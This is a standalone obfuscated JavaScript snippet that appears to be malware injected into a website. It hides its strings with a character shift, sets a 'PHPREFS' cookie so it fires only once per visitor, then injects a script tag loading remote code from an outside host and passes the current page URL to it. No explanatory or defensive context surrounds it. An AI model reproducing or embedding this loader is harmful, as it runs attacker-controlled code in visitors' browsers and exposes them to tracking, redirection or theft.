(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44zxjwxy" + "fy3sjy4ljy4xhwnu" + "y3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
